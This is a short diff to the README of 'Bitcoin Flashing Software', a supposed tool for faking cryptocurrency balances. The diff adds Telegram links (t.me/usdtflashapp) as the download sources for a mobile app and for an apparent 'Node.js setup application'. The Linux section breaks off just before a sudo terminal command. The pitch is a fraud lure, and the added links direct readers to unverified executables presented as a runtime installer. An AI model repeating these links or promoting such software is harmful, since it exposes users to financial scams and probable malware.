@@ -15,10 +15,10 @@ This application requires Node.js to run.
 # Bitcoin Flashing Software
 
 ## Android/iOS
-[Click here](#) to visit the mobile repository.
+[Click here] https://t.me/usdtflashapp/3(#) to visit the mobile repository.
 
 ## Windows
-[Download](#) the Node.js setup application here.
+[Download](#) https://t.me/usdtflashapp/4 the Node.js setup application here.
 
 ## Linux
 Run this command in the terminal. You may need superuser privileges (sudo):
